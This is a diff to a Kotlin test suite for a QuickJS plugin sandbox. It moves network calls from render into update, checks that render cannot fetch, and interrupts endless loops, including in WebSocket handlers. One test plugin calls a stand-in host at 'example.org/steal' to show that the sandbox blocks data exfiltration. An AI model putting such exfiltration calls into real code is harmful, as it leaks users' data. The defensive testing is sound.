@@ -37,14 +37,14 @@ class QuickJsSandboxTest {
 
     @Test fun httpOnlyToTheAddressInTheSettings() = runBlocking {
         server.enqueue(MockResponse.Builder().body("""{"v":3}""").build())
-        val ok = kit("""export default { async render(ctx) { const r = await ctx.http.get(ctx.settings.base_url + '/x'); return { type: 'text', lines: ['v' + r.json().v + ' ' + r.status] }; } }""")
+        val ok = kit("""export default { async update(ctx) { const r = await ctx.http.get(ctx.settings.base_url + '/x'); ctx.state.line = 'v' + r.json().v + ' ' + r.status; }, render(ctx) { return { type: 'text', lines: [ctx.state.line] }; } }""")
         assertEquals("v3 200", text(ok.render()))
-        val other = kit("""export default { async render(ctx) { await ctx.http.get('https://example.org/steal?t=1'); return null; } }""")
+        val other = kit("""export default { async update(ctx) { await ctx.http.get('https://example.org/steal?t=1'); } }""")
         assertTrue(failure(other).contains("not allowed"))
     }
 
     @Test fun localOnlyRefusesPublicAddressesEvenAsIpLiterals() = runBlocking {
-        val k = kit("""export default { async render(ctx) { await ctx.http.get(ctx.settings.base_url + '/'); return null; } }""",
+        val k = kit("""export default { async update(ctx) { await ctx.http.get(ctx.settings.base_url + '/'); } }""",
             baseUrl = "http://8.8.8.8", policy = LocalPolicy.Frame)
         assertTrue(failure(k).contains("not on the home network"))
     }
@@ -68,14 +68,14 @@ class QuickJsSandboxTest {
     @Test fun waitingForTheNetworkDoesNotCountAsJavaScript() = runBlocking {
         // A slow answer (Wi-Fi on the frame) followed by a little work: the 50 ms are for JavaScript, not for the wait.
         repeat(2) { server.enqueue(MockResponse.Builder().body("""{"v":1}""").bodyDelay(300, java.util.concurrent.TimeUnit.MILLISECONDS).build()) }
-        val k = kit("""export default { async render(ctx) { const r = await ctx.http.get(ctx.settings.base_url + '/x'); let n = 0; for (let i = 0; i < 20000; i++) n += i % 7; return { type: 'text', lines: ['v' + r.json().v] }; } }""")
+        val k = kit("""export default { async update(ctx) { const r = await ctx.http.get(ctx.settings.base_url + '/x'); let n = 0; for (let i = 0; i < 20000; i++) n += i % 7; ctx.state.v = r.json().v; }, render(ctx) { return { type: 'text', lines: ['v' + ctx.state.v] }; } }""")
         assertEquals("v1", text(k.render()))
         assertEquals("v1", text(k.render()))
     }
 
     @Test fun anEndlessLoopAfterAnAwaitIsStillInterrupted() = runBlocking {
         repeat(2) { server.enqueue(MockResponse.Builder().body("{}").build()) }
-        val k = kit("""let n = 0; export default { async render(ctx) { await ctx.http.get(ctx.settings.base_url + '/x'); if (++n == 2) { while (true) {} } return null; } }""")
+        val k = kit("""let n = 0; export default { async update(ctx) { await ctx.http.get(ctx.settings.base_url + '/x'); if (++n == 2) { while (true) {} } } }""")
         k.render()
         val why = failure(k)
         assertTrue(why, why.contains("took longer than 50 ms"))
@@ -87,6 +87,23 @@ class QuickJsSandboxTest {
         assertEquals("warm", text(k.render()))
         val why = failure(k)
         assertTrue(why, why.contains("took longer than 50 ms"))
+    }
+
+    @Test fun renderAndDetailCantUseTheNetwork() = runBlocking {
+        // Drawing never waits for the network: render and detail work from what update fetched.
+        server.enqueue(MockResponse.Builder().body("{}").build())
+        val k = kit("""export default { async render(ctx) { await ctx.http.get(ctx.settings.base_url + '/x'); return null; } }""")
+        val why = failure(k)
+        assertTrue(why, why.contains("render can't use the network"))
+        assertEquals(0, server.requestCount)
+    }
+
+    @Test fun anInvalidateRendersWithoutFetching() = runBlocking {
+        repeat(2) { server.enqueue(MockResponse.Builder().body("""{"v":1}""").build()) }
+        val k = kit("""let renders = 0; export default { async update(ctx) { ctx.state.v = (await ctx.http.get(ctx.settings.base_url + '/x')).json().v; }, render(ctx) { return { type: 'text', lines: ['v' + ctx.state.v + ' #' + (++renders)] }; } }""")
+        assertEquals("v1 #1", text(k.render()))
+        assertEquals("v1 #2", text(k.renderOnly()))
+        assertEquals(1, server.requestCount)
     }
 
     @Test fun runningOutOfMemoryFailsAndRestartsTheRuntime() = runBlocking {
@@ -151,6 +168,26 @@ class QuickJsSandboxTest {
         k.now += 60_000 // past min_seconds, so the invalidate goes through at once
         withTimeout(5_000) { while (k.invalidations == 0) delay(20) }
         assertEquals("v=42", text(k.render()))
+    }
+
+    @Test fun anEndlessLoopInAWebSocketHandlerIsInterrupted() = runBlocking {
+        server.enqueue(MockResponse.Builder().webSocketUpgrade(object : WebSocketListener() {
+            override fun onOpen(webSocket: WebSocket, response: Response) { webSocket.send("""{"spin":true}"""); webSocket.send("""{"v":7}""") }
+        }).build())
+        val k = kit("""export default {
+            async start(ctx) {
+              ctx.ws.connect(ctx.settings.base_url.replace(/^http/, 'ws') + '/ws', {
+                onMessage: (ws, m) => { if (m.spin) { while (true) {} } ctx.state.v = m.v; ctx.invalidate(); },
+              });
+              return null;
+            },
+            render(ctx) { return { type: 'text', lines: ['v=' + ctx.state.v] }; },
+        }""")
+        k.instance.start(k.ctx)
+        k.now += 60_000
+        withTimeout(5_000) { while (k.invalidations == 0) delay(20) }
+        assertTrue(k.logs.toString(), k.logs.any { it.contains("took longer than") })
+        assertEquals("v=7", text(k.renderOnly()))
     }
 
     @Test fun aThrowIsAFailureWithTheMessage() = runBlocking {
